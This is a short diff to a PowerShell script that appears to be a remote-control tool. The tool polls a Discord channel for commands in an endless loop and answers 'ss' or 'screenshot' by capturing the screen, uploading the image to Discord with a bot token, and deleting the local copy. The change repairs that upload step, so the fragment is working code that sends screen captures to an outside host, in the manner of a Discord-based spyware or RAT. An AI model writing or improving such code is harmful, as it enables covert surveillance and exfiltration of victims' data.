@@ -77,8 +77,7 @@ while ($true) {
             } elseif ($content -eq "ss" -or $content -eq "screenshot") {
                 $path = Get-Screenshot
                 if ($path) {
-                    Send-DiscordMessage -channelID $channel.id -content "Screenshot taken:" 
-                    Invoke-RestMethod -Uri "$baseUrl/channels/$($channel.id)/messages" -Method Post -Headers @{ "Authorization" = "Bot $TOKEN"; "User-Agent" = "Powershell" } -InFile $path -ContentType "multipart/form-data"
+                    Invoke-WebRequest -Uri "$baseUrl/channels/$($channel.id)/messages" -Method Post -Headers @{ "Authorization" = "Bot $TOKEN"; "User-Agent" = "Powershell" } -Form @{ "file" = Get-Item -Path $path; "payload_json" = '{"content": "Screenshot taken"}' }
                     Remove-Item -Path $path
                 } else {
                     Send-DiscordMessage -channelID $channel.id -content "Failed to take screenshot."
